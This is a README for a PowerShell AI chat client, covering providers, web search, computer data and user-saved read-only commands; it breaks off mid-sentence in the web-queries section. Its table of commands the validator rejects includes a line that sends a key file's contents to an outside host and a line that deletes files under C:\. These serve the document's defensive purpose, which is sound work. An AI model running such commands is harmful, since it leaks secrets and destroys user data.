[Español](README.es.md) · **English**

# PRC AI 2.0

Chat client for **OpenAI**, **xAI (Grok)** and local models (**Ollama** and
llama.cpp's **llama-server**) written in plain PowerShell for the Windows
console. No external dependencies: no curl, no Python, no Node. Type `AI` in
any CMD window and start talking.

It is a small personal project: it started as a handful of batch + gawk
scripts, and this version 2.0 rewrites it entirely on PowerShell 5.1 with its
own HTTP core (SSE streaming included). It is published in case it is useful
to someone else.

```
C:\> AI "explain in one line what SSE is"
Server-Sent Events: the server sends text over HTTP in chunks as it
generates it, and the client draws it as it arrives.
```

**Presentation video (2:09, narrated):**
[PRC AI 2.0 on YouTube](https://www.youtube.com/watch?v=7vM_9QslKjo). It shows the local chat, internet search,
saved commands and web queries, and how it learns from a coffee shop's
documents and forgets them. What appears in the terminal is real program
output, in English. There is also a
[Spanish version](https://www.youtube.com/watch?v=FhrSBxF6vFE). How they were
made: [`docs/video/GUION.md`](docs/video/GUION.md) (in Spanish).

## Features

- **Interactive REPL with memory**: the conversation builds up and is sent
  in full on every turn. `/new` clears it, `/save` saves it as JSON.
- **One-answer mode** for pipelines: `AI "question"` answers and exits.
- **Standard input as context**: `type notes.txt | AI "summarize this"`.
- **Token-by-token streaming** with incremental Markdown rendering and ANSI
  colors (turned off automatically when the output is redirected).
- **`<think>` filter** for local reasoning models: the reasoning block is not
  shown, even when it arrives split across SSE chunks.
- **Searches the internet when needed**, without opening the browser: the
  model decides whether the question needs current data (exchange rates,
  weather, news...) and, only if the laptop can reach the internet, searches
  DuckDuckGo, reads the first pages and answers with that, citing the
  sources. See "Searching the internet".
- **Knows what the laptop already knows**, without internet: the time and
  date come from the computer's clock, and the battery, the network (Wi-Fi,
  local IP, gateway, DNS, whether there is internet), Windows, the processor,
  memory, disks and graphics card are read from the computer itself when you
  ask about them. See "This computer's data".
- **Read-only commands that you save**, by asking in the conversation: "add a
  command to see my public IP". The chat asks questions, proposes the
  command, asks for confirmation, tests it and shows the result; from then
  on "what's my public IP?" gets answered on its own. Fixed rules, not the
  model, decide whether the command is read-only. See "Saved commands".
- **Saved web queries**: specific data from a page, as JSON. "add a command
  for the latest Nicaragua lottery draw from the internet": it finds the page
  on DuckDuckGo, takes the data and shows it to you before saving the query.
  From then on the page is read again every time you ask. See "Web queries".
- **Preferences that are remembered** from one conversation to the next:
  "remember to give me money figures in dollars". You write them and the
  model has them in front of it on every question. See "Preferences".
- **Learns from your documents**: "learn from the documents in
  D:\MyBusiness". It reads a folder (Word, Excel, PowerPoint, PDF,
  OpenDocument, text, CSV, HTML, RTF) and from then on answers with what they
  say about your business: services, staff, opening hours, procedures,
  policies... It says which document each fact comes from, and if a fact is
  not there, it says so instead of making it up. Everything stays on the
  computer. See "Documents" and, for day-to-day use, the
  [usage guide](docs/documents-guide.md).
- **Diagnostics** with `AI -Check`: key status and connectivity of the
  providers without spending tokens.
- **Local by default**: with nothing configured it talks to Gemma 4 E4B on
  the laptop's own llama-server, with no key and without sending the
  conversation to the cloud.
- **In Spanish or in English**: the messages come out in one language or the
  other, and what you type is understood in both. See "Language".

What changed in each version and why: [HISTORIAL.md](HISTORIAL.md) (in
Spanish).

## Requirements

- Windows 10/11.
- Windows PowerShell **5.1 or later** (the one that comes with Windows; it
  also works on PowerShell 7).
- Optional: [PSReadLine](https://github.com/PowerShell/PSReadLine) for
  persistent history in interactive mode (included with Windows 10/11).
- For the local providers: [Ollama](https://ollama.com) listening on
  `http://localhost:11434`, and/or `llama-server` from
  [llama.cpp](https://github.com/ggml-org/llama.cpp) in router mode on
  `http://127.0.0.1:8080` (see "Local models with llama-server").

### How much RAM you need

Measured on 2026-11-18 on the author's laptop (Intel Core i5-10300H, 4 cores
and 8 threads, 31.8 GB of RAM, NVIDIA GTX 1650 with 4 GB of graphics
memory), with Gemma 4 E4B (`gemma-4-e4b`, Q4_K_M: a 4.96 GB file and 7.5
billion parameters counting the per-layer embeddings) served by llama-server
with a 4096-token context:

| | RAM | Graphics card memory (VRAM) | |
| --- | --- | --- | --- |
| llama-server without the model loaded | ~0.5 GB | — | measured |
| llama-server with the model loaded and answering | ~3.5 GB | ~2.1 GB (went from 1.5 to 3.6 GB, out of 4) | measured |
| The program (PowerShell with everything loaded) | ~105 MB | — | measured |
| The model without a dedicated GPU, all in RAM | ~5.5–6 GB | — | estimated |

The model takes about 5.6 GB between RAM and graphics memory; with a 4 GB
GPU, about 3.5 GB of it lands in RAM. On that laptop it writes the answer at
about 9 tokens per second (179 tokens) and reads a short prompt at about 21
tokens per second.

- **With an NVIDIA GPU with 4 GB or more**, the minimum is 8 GB of RAM, and
  it is tight: the model's ~3.5 GB plus Windows 11, with few other apps
  open. With 16 GB it is comfortable.
- **Without a dedicated GPU**, the whole model (~5.5–6 GB) goes in RAM: the
  minimum is 16 GB, and it will be slower.
- **Recommended** for smooth use: 16 GB of RAM and an NVIDIA GPU with 4 GB
  or more.
- **With only cloud providers** (OpenAI, xAI) the model does not run on the
  PC: whatever Windows needs is enough.

It has not been measured without a GPU (everything on the CPU) or on an 8 GB
machine: the 8 GB minimum and the no-GPU figures are estimates, not
measurements.

## Installation

1. Clone or download this folder wherever you like, for example
   `D:\PRC CMD AI`.
2. Add that folder to the `PATH` (or create an alias). With that, `AI` works
   from any CMD window.
3. Save your API key (see the next section).

> **Note on ExecutionPolicy**: `AI.bat` starts PowerShell with
> `-ExecutionPolicy Bypass`. That affects **only that process**: it does not
> change any system policy or ask for administrator rights.

## Setting up keys

Keys **are not saved in files** and do not go through the command line.
`tools/Set-AIKey.ps1` asks for them with `Read-Host -AsSecureString` (they
are not shown as you type and do not stay in the history) and writes them as
a user environment variable in `HKCU\Environment`, in the *User* and
*Process* scopes:

```
AI -SetKey OPENAI_API_KEY     # for OpenAI
AI -SetKey XAI_API_KEY        # for xAI / Grok
```

To delete a key, from the project folder:
`powershell -ExecutionPolicy Bypass -File tools\Set-AIKey.ps1 -Name XAI_API_KEY -Remove`.

Ollama and llama-server do not need a key. If you start llama-server with
`--api-key`, save it with `AI -SetKey LOCAL_AI_API_KEY`.

> **Scope precedence**: the code reads the *User* scope (HKCU) first and
> only falls back to the *Process* scope if it does not exist. This is
> deliberate (the key saved with `-SetKey` is seen right away, without
> opening a new console), but it means that a session
> `$env:XAI_API_KEY = '...'` has **no** effect if there is already a key
> saved in the registry. Delete it with `-Remove` if you want to try another
> key temporarily.

## Usage

```
AI                              interactive mode (REPL with memory)
AI "what is a UTF-8 BOM"        one answer and exit
type report.txt | AI "summarize"  standard input goes in as context
type report.txt | AI            no question: all of stdin is the question
AI "question" -Provider gpt     choose the provider (aliases: gpt, grok, deepseek...)
AI "question" -Provider gemma   local model (Gemma 4 E4B)
AI "question" -Provider gemma3  faster local model (Gemma 3 4B)
AI "question" -Provider qwen    more capable and slower local model (Qwen3 8B)
AI "question" -Provider gpt -m gpt-4o -Temp 0.2 -NoStream -Plain
AI "question" -NoWeb            without searching the internet
AI "question" -NoComputer       without reading this computer's data
AI "question" -NoCommands       without using the saved commands
AI "question" -NoDocuments      without using the document folders
AI "question" -Lang en          messages in English (see "Language")
AI -Check                       check the providers, the internet, the computer
                                and the saved commands
AI -Help                        full help
```

Inside interactive mode:

| Command        | Effect                          |
| -------------- | ------------------------------- |
| `bye` / `exit` | quit                            |
| `cls`          | clear the screen                |
| `/new`         | clear the memory                |
| `/model X`     | change the model                |
| `/provider X`  | change the provider             |
| `/save [path]` | save the conversation as JSON   |
| `/search X`    | search X on the internet and answer with what is found |
| `/web on\|off` | let the model search on its own, or not |
| `/computer [X]` | show this computer's data without asking the model (X: `battery`, `network`, `computer`, `system`, `processor`, `memory`, `disk`, `graphics`) |
| `/computer on\|off` | let this computer's data be read when you ask, or not |
| `/language en\|es` | change the language of the messages (it stays saved; see "Language") |
| `add a command to ...` | save a command by chatting: the chat asks, proposes, asks for confirmation, tests it and shows the result |
| `/command add N C` | the same in one go: check command `C` and save it with the name `N` |
| `/command`     | list of the saved commands |
| `/command N`   | run the saved command `N` and show its output, without the model |
| `/command remove N` | delete it |
| `/command on\|off` | let the model use the saved commands, or not |
| `remember that ...` | save a preference for this and future conversations |
| `/preferences` | list of the saved preferences; `/preference add X` and `/preference remove N` |
| `learn from the documents in D:\MyBusiness` | read a folder of documents and answer with what they say |
| `/documents`   | the document folders and what was read; `/documents search X` shows where the answer would come from |
| `forget about ...` | forget something from the documents (`/documents forgotten` and `/documents restore N` undo it) |
| `/help`        | show the help                   |

With nothing configured, the provider is `gemma`: Gemma 4 E4B on the local
llama-server (`http://127.0.0.1:8080`), with no key and with nothing leaving
the laptop. That server needs to be running, or you need to choose another
provider. Provider precedence: the `-Provider` option, the `AI_PROVIDER`
environment variable, `settings.json` and, if there is nothing, `gemma`.

The default configuration (provider, model, system instruction) can be set
in `%LOCALAPPDATA%\PRC-CMD-AI\settings.json`:

```json
{ "provider": "xai", "model": "grok-4.3", "system": "Answer briefly and to the point." }
```

The environment variables `AI_PROVIDER` (default provider) and `AI_QUESTION`
(used internally by `AI.bat` to pass the question intact) also work.

The `model` in `settings.json` goes with its `provider`: if you choose
another provider with `-Provider` or `AI_PROVIDER`, that provider's default
model is used. To make another local model the default:
`{ "provider": "qwen" }`.

In the same file, `"web": false` turns off internet search, `"equipo": false`
turns off reading this computer's data and `"comandos": false` turns off the
saved commands. `"language": "en"` (or `"es"`) sets the language of the
messages.

## Language

The program's messages come out in Spanish or in English. The language is
chosen in this order:

1. the `-Lang es` or `-Lang en` option (`-Idioma` also works);
2. the `AI_LANG` environment variable;
3. `"language"` in `settings.json`;
4. if there is none of that and the data folder
   (`%LOCALAPPDATA%\PRC-CMD-AI`) already exists, Spanish: whoever was
   already using it was using it in Spanish, which used to be the only
   language;
5. if it is the first time, the Windows display language: `es-*` is
   Spanish, and anything else, English.

In interactive mode, `/language en` (or `/lang en`, `/idioma en`) changes it
right away and saves it in `settings.json` without touching the other keys.
`/language` on its own says which one is active. With the factory system
instruction, the model also answers in the chosen language; if you set your
own with `-System` or in `settings.json`, yours wins.

- **What you type is understood in both languages**, whichever language the
  program is in: "yes" and "sí", "cancel" and "cancelar", "remember that..."
  and "recuerda que...", "learn from the documents in X" and "aprende de los
  documentos de X", "forget about X" and "olvida lo de X", "add a command
  to..." and "agrégame un comando para...".
- **The commands have Spanish names too**, and both forms always work:
  `/search` is `/buscar`, `/computer` is `/equipo`, `/command add` is
  `/comando agregar`, `/preference remove` is `/preferencia quitar`,
  `/documents forget` is `/documentos olvidar`, `/documents cloud on` is
  `/documentos nube on`... The full list is in `$AI_ORDENES` and
  `$AI_SUBORDENES`, at the start of `bin/ai.ps1`. The options too:
  `-NoComputer` is `-NoEquipo`, `-NoCommands` is `-NoComandos` and
  `-NoDocuments` is `-NoDocumentos`.
- In English the answer label is `ai >` instead of `ia >`, and `AI -Help`
  comes out in English.
- Changing the language does not force the documents to be read again,
  except Excel files: in English their dates, times and currency come out as
  in an English Excel (see "Documents"), so they are read again.

## Supported providers

| `-Provider` | Service              | Key variable      | Default model      | Aliases                       |
| ----------- | -------------------- | ----------------- | ------------------ | ----------------------------- |
| `openai`    | OpenAI               | `OPENAI_API_KEY`  | `gpt-4o-mini`      | `gpt`, `chatgpt`, `oai`       |
| `xai`       | xAI                  | `XAI_API_KEY`     | `grok-4.3`         | `grok`, `x`                   |
| `ollama`    | Ollama (local)       | *(not needed)*    | `qwen3:4b`         | `deepseek`, `local`, `ds`     |
| `gemma`     | llama-server (local) | *(not needed)*    | `gemma-4-e4b`      | `gemma4`, `e4b`, `llama`, `llamacpp` |
| `gemma3`    | llama-server (local) | *(not needed)*    | `gemma-3-4b`       | |
| `qwen`      | llama-server (local) | *(not needed)*    | `qwen3-8b`         | `qwen3`                       |

They all speak the same dialect (`POST /v1/chat/completions`), so adding a
compatible provider means adding an entry to the table in
`lib/providers.ps1`. Nothing else.

### Local models with llama-server

`gemma`, `gemma3` and `qwen` are three entries that point to the **same**
`llama-server` in router mode (`--models-preset file.ini`): one port, several
models.

To run your own you need a recent llama.cpp with router mode (the author
uses build b10209). Create a models file, for example `models.ini` (ASCII or
UTF-8 without BOM; each key is a `llama-server` argument without the dashes;
paths go without quotes):

```ini
version = 1

[*]
ctx-size = 4096
parallel = 1
sleep-idle-seconds = 120

[gemma-4-e4b]
model = models\gemma-4-E4B-it-Q4_K_M.gguf
; fully on the GPU it needs more than 4 GB; with 4 GB, about 32 layers
n-gpu-layers = 99

[gemma-3-4b]
model = models\gemma-3-4b-it-Q4_K_M.gguf
n-gpu-layers = 99

[qwen3-8b]
model = models\Qwen3-8B-Q4_K_M.gguf
reasoning-budget = 0
```

and start the server from the folder that contains that file and `models\`:

```
llama-server --models-preset models.ini --models-max 1 --host 127.0.0.1 --port 8080
```

The `.gguf` files can be different ones: what has to match
`lib/providers.ps1` is the name of each section.

- The model is chosen with the `model` field of the request, which has to
  match a section of the models file letter for letter (`[gemma-4-e4b]`,
  `[gemma-3-4b]`, `[qwen3-8b]`). With another name the server answers
  `HTTP 400 -> model '...' not found`.
- `AI` does not start the server. If it is not running, the error says so
  (`nothing is listening at http://127.0.0.1:8080/v1`) and adds how to start
  it: `Start the service:  ` plus the command in `$AI_LLAMA_HINT` (the
  sentence is added by `Get-AIProviderHint`, in the language of the
  messages). The command that comes in the repository is the author's
  (`pm2 start rpa-ai-portable`): change it in `$AI_LLAMA_HINT`, in
  `lib/providers.ps1`, to the one that starts your server.
- With `--models-max 1` only one model is in memory: the first question
  after switching models takes quite a bit longer (11 to 18 s on the
  author's computer) and, after the idle sleep, about 5 s more.
- Time limit until the server starts answering: 300 s with `gemma` and
  `gemma3` and 600 s with `qwen` (the `Timeout` field in
  `lib/providers.ps1`), because before the first word the server may have to
  load or switch the model and read the whole input. For the other providers
  it is 30 s.
- If another client of the same server asks for the other model at the same
  time, one of the two questions may be cut off or fail with
  `HTTP 500 ... failed to load`. `AI` says so (`the answer was cut off`) and
  does not retry on its own: you have to repeat the question. In one-answer
  mode it exits with code 2; in interactive mode the failed turn is removed
  from memory and the session goes on.
- If there is a single-model `llama-server` on that port (without
  `--models-preset`), the `model` field chooses nothing: it always answers
  with its own, also for `-Provider qwen`. `AI -Check` gives it away
  (`answers, but does not offer 'qwen3-8b'`).
- In interactive mode, `/provider qwen` switches models without quitting.
- `gemma3` is not offered tools (the `Tools = $false` field in
  `lib/providers.ps1`): Gemma 3 4B does not know how to ask for them. With
  `buscar_web` in view it did not search and answered as if it had ("According
  to a web search, the dollar is at 37 córdobas", made up; 3 out of 3
  questions on 2026-11-15). Without tools it says it cannot search. With
  `gemma3` there is still `/search X`, and the computer's data reaches it
  through the shortcut (see "This computer's data").
- `qwen` asks for answers without reasoning (`reasoning_budget_tokens = 0`
  in every request, the `Extra` field): Qwen3 reasons by default and `AI`
  does not show that reasoning, so every question would mean 1 to 5 minutes
  of blank screen (measured on the author's computer).
- The context is set by the server. With 4,096 tokens, inputs of up to about
  3,000 fit; if `HTTP 400` shows up in a long chat, use `/new`.
- Another port, other model names or another start command: `$AI_LLAMA_URL`,
  the `Model` field and `$AI_LLAMA_HINT` in `lib/providers.ps1`.
- `AI -Check` reads `/v1/models` and, for the local providers, also checks
  that the server offers each entry's model. In router mode it adds the
  status the server gives: `OK (loaded)`, `OK (loading)`, `OK (sleeping)` or
  `OK (unloaded)`. It says `answers, but does not offer 'qwen3-8b'` if there
  is a single-model server or one with other names on that port, and
  `stopped.` plus the start command (`Get-AIProviderHint`) if nothing is
  listening. It does not load or wake any model.

## Searching the internet

For everyday questions there is no need to open the browser, go to the
search engine and read: you ask in the console and `AI` searches if needed.

```
Ariel > what's the dollar exchange rate in Nicaragua today?
ai > searching: dollar exchange rate Nicaragua today
ai > The dollar exchange rate in Nicaragua today is 36.81 córdobas (selling)...
   sources: https://www.bcn.gob.ni/...  https://www.cotizacion.co/...
```

- **Who decides**: the model. Every question comes with a tool on offer,
  `buscar_web` (the `tools` field of `/chat/completions`, the same in OpenAI,
  xAI, Ollama and llama-server). What does not change over time ("what is
  748 times 6", "what is a BOM") it answers on its own, right away; prices,
  exchange rates, weather, news or results call for a search. At most two
  searches per question.
- **Only if there is a connection**: before each question it tries a
  connection to `html.duckduckgo.com:443` with a 2 s limit (remembered for
  60 s if there is a connection and 15 s if not). Without a connection the
  tool is not offered, the model knows it cannot search and answers with
  what it knows, warning that it may be out of date. `AI -Check` says
  whether there is a connection.
- **What it reads**: the DuckDuckGo results (free, no key) with their
  summaries and the text of the first two pages that can be read, trimmed
  to fit in the local server's 4096 tokens. It never requests addresses on
  the home network (127.0.0.1, 192.168.x.x...), even if a result points
  there. After searching, the model answers with temperature 0.2 to stick to
  what it read.
- **Memory**: the question and the answer are kept, not the pages read.
- **Turning it off**: `-NoWeb` on a question, `/web off` in interactive mode
  or `"web": false` in `settings.json`. `/search X` always searches, without
  waiting for the model to decide.
- **Limits**: pages that load with JavaScript (many sports results pages,
  the BCN exchange rate page) arrive without the data; then the model relies
  on the result summaries or says it did not find it. If DuckDuckGo takes
  the query for a robot, it says so. It depends on the model knowing how to
  ask for tools: Gemma 4 E4B and Qwen3 8B do; Gemma 3 4B does not, and that
  is why with `gemma3` searching only happens with `/search`.

## This computer's data

Some things are not on the internet or in the model's memory, but on the
laptop itself: the time, the battery, the network it is connected to. Asking
about them needs no connection.

```
Ariel > what's my IP?
ai > reading from this computer: network
ai > Your IP address on the local network is 192.168.1.23 (over Wi-Fi).
     The public IP can't be read from this computer.
Ariel > what time is it?
ai > It's 11:01 AM on Sunday, November 15, 2026.
```

| If you ask about… | It comes from |
| --- | --- |
| The time, the date, what day tomorrow is | The computer's clock |
| The battery: charge, whether it is plugged in, time left | Windows |
| Whether there is internet, the Wi-Fi network and its signal, the local IP, the gateway, the DNS servers | Windows and the local network |
| The computer's name, the Windows user, the make and model | Windows |
| The Windows version and how long it has been on | Windows |
| The processor, the RAM, the disks and the graphics card | Windows |

It works with three pieces (`lib/equipo.ps1`):

- **The clock** travels in the system instruction of every question: the
  time and date are answered right away, with any provider.
- **The shortcut**: if the question clearly asks for data from this
  computer ("what's my IP", "how much battery do I have left", "how much RAM
  does this laptop have"), `AI` reads it before asking the model and passes
  it along with the question. That way it does not depend on the model
  knowing how to ask for tools, and it is answered in a single round (2 to
  5 s with Gemma 4 E4B). Two things are needed for it to kick in: the topic
  and a sign that the question is about this computer ("my", "I", "do I
  have", "this laptop").
- **The `datos_equipo` tool**, for what the shortcut does not recognize: it
  is offered to the model just like `buscar_web` and the model decides.
  Unlike `buscar_web`, it is offered whether or not there is internet,
  because it does not go anywhere.

Worth knowing:

- **Read-only and a closed list.** There are eight fixed readings (battery,
  network, computer, system, processor, memory, disk, graphics; inside the
  program they are called `bateria`, `red`, `equipo`, `sistema`,
  `procesador`, `memoria`, `disco`, `grafica`). From the model comes the
  name of a reading, never a command: neither what you type nor what the
  model writes reaches a command line. None of this makes requests to the
  internet; whether there is a connection is told by Windows' network
  indicator.
- **It does not take for its own what is not.** "How much battery does the
  iPhone 15 have?", "what processor does the Lenovo Legion 5 have?" or "how
  much RAM does a gaming laptop have?" are not about this computer: nothing
  is read and they are searched on the internet as usual. "What is an IP
  address?" is explained by the model.
- **If it could not read a piece of data, it says so** and does not put
  another in its place. The public IP (the one internet sites see) is not on
  the computer, and it says that too; to get it you have to ask an outside
  server, and that is done by saving a command (see "Saved commands").
- **Without the model**: `/computer` shows everything it read on screen, and
  `/computer network` or `/computer disk memory` only that part. It works
  without a server and without internet.
- **With a cloud provider** (OpenAI, xAI), what was read travels to that
  provider along with the question, like any other message: the computer's
  name, the user or the Wi-Fi network included, if that is what was asked.
  Only what the question asks for is read.
- **Turning it off**: `-NoComputer` on a question, `/computer off` in
  interactive mode or `"equipo": false` in `settings.json`. The time and
  date are still given.
- **Limits**: the shortcut is a list of expressions and does not recognize
  everything; a question without the sign ("how much battery is left?") is
  decided by the model, which with Gemma 4 E4B reads the data or asks which
  computer you mean. With a model without tools (`gemma3`) only the shortcut
  works: what it does not recognize gets an "I can't know that". The time in
  another city does not come from the clock: the model searches the
  internet for it if there is a connection.

## Saved commands

Some data `AI` does not bring out of the box, but a PowerShell command gives
it in one line: the public IP, the processes that have used the most
processor time, whether the antivirus is on. They are saved from the chat
itself, with a name, and from then on the model can ask for them by that
name.

### By asking in the conversation

Just ask: "add a command to see my public IP", "I want to save a command",
"save this command as see-dns: Get-DnsClientServerAddress". The chat asks
and you answer:

```
Ariel > add a command to see my public IP
ai > Let's save a read-only command. I ask and you answer; type "cancel" to leave it.
ai > Looking for a read-only command for: see my public IP
ai > This is the command:

  command:  Invoke-RestMethod -Uri https://api.ipify.org
  rules:    passes (Invoke-RestMethod)
  network:  goes out to the internet, to api.ipify.org (https, read only)
  model, with the Microsoft documentation in view:
    The command makes a web request to the ipify.org API. It reads the
    computer's public IP address from that API. It does not send data or
    change anything on the local computer.

ai > Is it OK like this? Answer "yes", or tell me what to change.
Ariel > yes
ai > What name should I save it under? Press Enter for "public-ip". When you ask with those words, I'll run it.
Ariel >
ai > What is it for, in one sentence? I'll read it to know when to use it. Press Enter for "see my public IP".
Ariel >
ai > I have no more questions. This is what I'm going to save:

  name:     public-ip
  command:  Invoke-RestMethod -Uri https://api.ipify.org
  purpose:  see my public IP
  network:  goes out to the internet, to api.ipify.org

ai > Shall I test it now and, if it works, keep it saved? ("yes" or "no")
Ariel > yes
ai > Testing...
ai > Test result (0.3 s):

  203.0.113.7

ai > It worked and it's saved as "public-ip". Ask me with the words "public ip" and I'll run it, or type it yourself with /command public-ip.
```

- **If you don't give the command, the model proposes one**, and what it
  proposes goes through the same rules as what you type. If it does not
  pass them, the model is told why and fixes it (three attempts). If you ask
  for something that is not read-only ("to delete the temp files"), it says
  it can't be done.
- **You can ask for changes** ("make it five", "only the date") or paste
  another command yourself in any answer.
- **The questions end with a summary and a single confirmation.** Until
  that "yes", nothing is run or saved.
- **It is tested before saving.** If the test fails or returns no data, it
  is not saved, and you can change it or drop it.
- **"cancel"** stops it at any time.
- The questions are fixed, not written by the model: the dialog does not
  depend on the model remembering to ask for confirmation.
- It is opened by sentences that start with "add", "save", "register" or
  "store" (or "I want to add…", "can you save…") and name a command. "Create
  a git command to…" does not: that asks for one to be written, and the
  model answers it.

### In one go, with `/command add`

If you already have the command and the name:

```
Ariel > /command add public-ip Invoke-RestMethod -Uri https://api.ipify.org

  command:  Invoke-RestMethod -Uri https://api.ipify.org
  rules:    passes (Invoke-RestMethod)
  network:  goes out to the internet, to api.ipify.org (https, read only)
  model, with the Microsoft documentation in view:
    This command makes an HTTP request to the ipify.org API. It reads the
    computer's public IP address from that API. It does not send data or
    change anything on the local computer.

  what is it for? (one sentence; the model reads it to know when to use it) > my public IP
  save it? (y/n) > y
saved as "public-ip". First run:
203.0.113.7

Ariel > what's my public IP?
ai > running the saved command: public-ip
ai > Your public IP is 203.0.113.7.
```

### Who decides whether a command is allowed

**Fixed rules, not the model.** The model explains the command (with the
beginning of the Microsoft documentation in view, if there is a connection)
and warns if it sees something odd, but it approves nothing: a model makes
mistakes, and a page that says "this command is safe" is outside text. In
the end you confirm, seeing the exact command and which server it goes out
to.

The rules (`Get-AIComandoPlan`, in `lib/comandos.ps1`):

1. **Nothing is saved without your "yes"**, and only in interactive mode.
   You type the command or the model proposes it when you ask; what it
   proposes is not valid because it comes from the model, but if it passes
   the following rules, the same in both cases. A web page or the output of
   another command cannot add anything.
2. **It is analyzed with PowerShell's own parser**, not with regular
   expressions. It has to be a single pipeline of commands with fixed
   arguments. Variables, strings with substitution, parentheses, `{ }`
   blocks, method calls, `[..]` types, redirections, comments and `;`, `&`,
   `.` are rejected.
3. **Each command has to be on a closed list**, by its full name (aliases do
   not count: `irm` no, `Invoke-RestMethod` yes) and come from a module in
   the Windows folder. A program is only allowed if it is in `System32`, is
   signed by Microsoft and its arguments match an allowed form:
   `ipconfig /all` yes, `ipconfig /release` no.
4. **Each parameter has to be on that command's list.** Abbreviations
   (`-OutF`) and unnamed arguments are resolved by PowerShell's binder
   before comparing.
5. **What goes out to the internet**: only `https`, a fixed address, a
   public server (never `192.168.x.x`, `localhost` or home network names),
   read-only (`GET`), without following redirects and only as the first
   command. Since it receives nothing through the pipeline, it cannot take
   data out of the computer.

What passes and what does not:

| Command | Result |
| --- | --- |
| `Invoke-RestMethod -Uri https://api.ipify.org` | Passes; warns that it goes out to the internet, to api.ipify.org |
| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 5 Name, CPU` | Passes |
| `Get-MpComputerStatus \| Select-Object AntivirusEnabled` | Passes |
| `ipconfig /all \| Select-String DNS` | Passes |
| `ipconfig /release` | No: it is not a read-only form of `ipconfig` |
| `Get-ChildItem C:\ \| Remove-Item` | No: they are not on the list |
| `Get-Process \| ForEach-Object Kill` | No: `ForEach-Object` would call a method on each object |
| `Invoke-RestMethod "https://x.com/?d=$(Get-Content key.txt)"` | No: the address is not fixed |
| `Get-Process \| Invoke-RestMethod -Uri https://x.com -Method Post` | No: what goes out to the internet can only come first |
| `Invoke-WebRequest -Uri http://192.168.0.1/reboot` | No: neither `https` nor a public server |
| `.\my-script.ps1`, `C:\Tools\x.exe`, `powershell -Command ...` | No: neither scripts nor programs from outside Windows |

### What is on the list

- **They produce data** (only as the first command): `Get-Date`,
  `Get-Culture`, `Get-TimeZone`, `Get-ComputerInfo`, `Get-Process`,
  `Get-Service`, `Get-HotFix`, `Get-PSDrive`, `Get-CimInstance`,
  `Get-NetAdapter`, `Get-NetIPAddress`, `Get-NetIPConfiguration`,
  `Get-NetRoute`, `Get-NetConnectionProfile`, `Get-NetFirewallProfile`,
  `Get-DnsClientServerAddress`, `Get-Volume`, `Get-Disk`, `Get-PhysicalDisk`,
  `Get-Partition`, `Get-PnpDevice`, `Get-Printer`, `Get-MpComputerStatus`,
  `Resolve-DnsName`, `Test-Connection`, `Test-NetConnection`,
  `Invoke-RestMethod`, `Invoke-WebRequest`.
- **They sort, pick or format** (only after another one): `Select-Object`,
  `Where-Object` (in its `Where-Object Status -eq Running` form),
  `Sort-Object`, `Measure-Object`, `Group-Object`, `Format-List`,
  `Format-Table`, `Select-String`, `ConvertTo-Json`, `ConvertFrom-Json`,
  `ConvertTo-Csv`, `Out-String`.
- **System32 programs**, with their read-only forms: `ipconfig`, `hostname`,
  `whoami`, `systeminfo`, `getmac`, `arp -a`, `route print`, `tasklist`,
  `driverquery`, `powercfg /list`, `netsh wlan show ...`,
  `netsh interface ... show ...`, `ping`, `nslookup`.
- **Left out on purpose**: whatever reads files, the registry, the clipboard
  or the event logs (`Get-Content`, `Get-ChildItem`, `Get-ItemProperty`,
  `Get-Clipboard`, `Get-WinEvent`), because what is read travels to the
  model; and everything that writes or changes something.

The list and the parameters of each command are in `$AI_CMD_CMDLETS` and
`$AI_CMD_EXES`, at the start of `lib/comandos.ps1`. Extending it means adding
an entry there.

### How it runs

- **The text is never run.** Validation produces a plan (each command with
  its module, its parameters already resolved and their values) and what
  runs is that plan, piece by piece. There can be no difference between what
  was checked and what runs.
- **Every run goes through the rules again.** A `comandos.json` changed by
  hand into something that does not pass them is not run: it says "it no
  longer passes the rules".
- **With a time limit and a cap**: 15 seconds and 4,000 characters of
  output.
- **With the console's permissions.** It never asks for administrator
  rights.
- **The model asks by name.** The `comando_guardado` tool only accepts a
  name from the list; the model cannot write a command.
- **The shortcut.** If the question has all the words of a saved command's
  name ("public ip" for `public-ip`), the program runs it without waiting
  for the model to ask, so the data is always current. It also works with
  `gemma3`.
  - If the question names several, up to two are run: "give me the date and
    time, and the btc price" runs `date-time` and `btc-price`.
  - It does not kick in if the question asks for an explanation, a "how to",
    code or a purchase, or if it is about another device. The words of the
    name itself do not count as a brake: with `btc-price` saved, "price" does
    not stop "give me the btc price".
  - `/command public-ip` runs it without going through the model.
- **The output goes in as data**, labeled with the server it comes from.
  After running a saved command no more tools are offered in that turn, so
  that an outside answer cannot chain another action.

### Limits

- **Read-only is not the same as private.** The output travels to the
  model's provider along with the question; with a cloud one (OpenAI, xAI),
  it leaves the computer.
- **Of an outside server, all that is known is which one is called**, not
  what it does with the visit. That is why you see it and confirm it.
- **The list is short and will reject legitimate commands.** That is on
  purpose: it is extended by hand.
- **The model can misread an output.** To the `CPU` column of
  `Get-Process`, which is processor seconds, Gemma 4 E4B added a percent
  sign; now it is asked not to add units the output does not state, but a
  clear output helps (`Select-Object` with few fields).
- **Up to 20 commands**, saved in `%LOCALAPPDATA%\PRC-CMD-AI\comandos.json`.
  They are turned off with `-NoCommands`, `/command off` or
  `"comandos": false` in `settings.json`.

## Web queries

A web query is another kind of saved command: it always reads the same page
and takes specific data from it, as JSON. It is for what a page publishes
and no service gives in one line: the latest lottery draw, a published
exchange rate, a schedule.

```
Ariel > add a command for the latest Nicaragua lottery draw from the internet
ai > Searching DuckDuckGo: Nicaragua lottery draw results official page
ai > Which of these pages should I take the data from?

  1. Resultados | Lotería Nacional
     https://loterianacional.com.ni/resultados/
  ...

Ariel >
ai > This is what I get right now from loterianacional.com.ni:

  page:     https://loterianacional.com.ni/resultados/
  labels:   draw="Sorteo" winner="Ganador:" prize="Premio:" date="Fecha:" branch="Sucursal:"

  {
    "draw": "2304",
    "winner": "12010",
    "prize": "C$8,000,000",
    "date": "10/11/2026",
    "branch": "Tipitapa"
  }

ai > Is it OK like this? ...
```

The labels are the page's own text, here in Spanish; the field names are
yours.

### How it works

- **The labels.** Each piece of data is defined by its label, the fixed text
  that comes right before it on the page. If the page says "Ganador: 12010",
  the `winner` field has the label `Ganador:`. The program looks for the
  label ignoring case and accents and keeps what follows it on that row, or
  the next row if the label's row has nothing else.
- **The blocks.** If the page repeats the data (one block per draw), the
  label that comes first marks where each block starts. The other data is
  only looked for inside its block. If the first draw is missing a piece of
